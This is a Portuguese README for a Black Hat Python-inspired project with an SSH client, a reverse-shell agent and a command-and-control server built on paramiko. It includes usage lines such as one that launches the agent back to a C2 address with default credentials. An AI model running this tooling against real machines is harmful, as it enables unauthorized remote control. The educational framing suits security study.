# Projeto Black Hat Python SSH

Este projeto explora implementações de ferramentas SSH em Python, inspiradas no livro *Black Hat Python* [1]. Ele demonstra a criação de um cliente SSH básico, um reverse shell (agente) e um servidor SSH (Centro de Comando e Controle - C2), utilizando a biblioteca `paramiko`.

## ⚠️ Aviso de Segurança e Uso Ético

As ferramentas contidas neste projeto são para **fins educacionais e de pesquisa em segurança cibernética apenas**. O uso indevido dessas ferramentas para atividades ilegais ou não autorizadas é estritamente proibido e pode resultar em sérias consequências legais. Sempre obtenha permissão explícita antes de testar qualquer sistema.

## Pré-requisitos

*   Python 3.x
*   Biblioteca `paramiko`

## Instalação

Para instalar a biblioteca `paramiko`, utilize `pip`:

```bash
sudo pip3 install paramiko
```

## Componentes do Projeto

O projeto é composto por três scripts principais:

1.  **`ssh_client_improved.py`**: Um cliente SSH simples para executar comandos em um servidor SSH remoto.
2.  **`reverse_shell_improved.py`**: Um agente de reverse shell que se conecta a um servidor SSH (C2) e executa comandos recebidos localmente.
3.  **`ssh_server_improved.py`**: Um servidor SSH que atua como um Centro de Comando e Controle (C2), aceitando conexões de agentes de reverse shell e enviando comandos.

### 1. Cliente SSH Simples (`ssh_client_improved.py`)

Este script permite que você se conecte a um servidor SSH padrão (como um servidor Linux) e execute um único comando, recebendo sua saída. É uma versão aprimorada do cliente SSH básico, com tratamento de erros e validação de entrada.

**Uso:**

```bash
python3 ssh_client_improved.py
```

O script solicitará o IP, porta, usuário, senha e o comando a ser executado. Você também pode fornecer esses argumentos diretamente:

```bash
python3 ssh_client_improved.py -i <IP_DO_SERVIDOR> -p <PORTA> -u <USUARIO> -P <SENHA> -c "ls -la"
```

### 2. Agente de Reverse Shell (`reverse_shell_improved.py`)

Este script deve ser executado na máquina "alvo". Ele se conecta a um servidor SSH (o C2) e aguarda comandos para executar localmente. A saída dos comandos é enviada de volta para o C2.

**Uso:**

```bash
python3 reverse_shell_improved.py -i <IP_DO_C2> -p <PORTA_DO_C2> -u <USUARIO_C2> -P <SENHA_C2> [--pty]
```

*   `<IP_DO_C2>`: Endereço IP do servidor C2 (onde `ssh_server_improved.py` está rodando).
*   `<PORTA_DO_C2>`: Porta do servidor C2.
*   `<USUARIO_C2>`: Usuário para autenticação no C2 (padrão: `tim`).
*   `<SENHA_C2>`: Senha para autenticação no C2 (padrão: `sekret`).
*   `--pty`: Opcional. Aloca um pseudo-terminal para a sessão, permitindo um shell mais interativo.

**Exemplo:**

```bash
python3 reverse_shell_improved.py -i 192.168.1.100 -p 2222 -u tim -P sekret --pty
```

### 3. Servidor SSH / Centro de Comando e Controle (C2) (`ssh_server_improved.py`)

Este script deve ser executado na máquina do "atacante". Ele escuta por conexões de agentes de reverse shell, autentica-os e permite que o operador envie comandos para os agentes conectados.

**Antes de rodar:**

O servidor SSH requer uma chave privada RSA. Se o arquivo `test_rsa.key` não existir no mesmo diretório do script, ele será gerado automaticamente na primeira execução.

**Uso:**

```bash
python3 ssh_server_improved.py -i <IP_PARA_ESCUTA> -p <PORTA_PARA_ESCUTA> -u <USUARIO_AUTENTICACAO> -P <SENHA_AUTENTICACAO>
```

*   `<IP_PARA_ESCUTA>`: IP no qual o servidor irá escutar (padrão: `0.0.0.0` para todas as interfaces).
*   `<PORTA_PARA_ESCUTA>`: Porta para escuta (padrão: `2222`).
*   `<USUARIO_AUTENTICACAO>`: Usuário para autenticação dos agentes (padrão: `tim`).
*   `<SENHA_AUTENTICACAO>`: Senha para autenticação dos agentes (padrão: `sekret`).

**Exemplo:**

```bash
python3 ssh_server_improved.py -i 0.0.0.0 -p 2222 -u tim -P sekret
```

Após iniciar o servidor, ele aguardará conexões. Quando um agente se conectar e autenticar, você poderá interagir com ele através do terminal do C2.

## Considerações de Segurança

*   **`paramiko.AutoAddPolicy()`**: Todos os scripts utilizam `AutoAddPolicy` para simplificar a conexão. **Isso não é seguro para ambientes de produção**, pois desabilita a verificação de chaves de host e pode expor a ataques Man-in-the-Middle. Em um cenário real, use `paramiko.RejectPolicy()` ou gerencie o `known_hosts` de forma adequada.
*   **Credenciais Hardcoded**: O servidor C2 utiliza credenciais `tim`/`sekret` por padrão. **Altere-as imediatamente** e considere usar autenticação por chave pública para maior segurança.
*   **`shell=True` no Reverse Shell**: A execução de comandos com `shell=True` no `subprocess.run` do reverse shell pode ser um risco de injeção de comandos se não for tratada com cuidado. Embora `shlex.split` ajude, é uma área que exige atenção.

## Referências

[1] Justin Seitz. *Black Hat Python: Python Programming for Hackers and Pentesters*. No Starch Press, 2014.
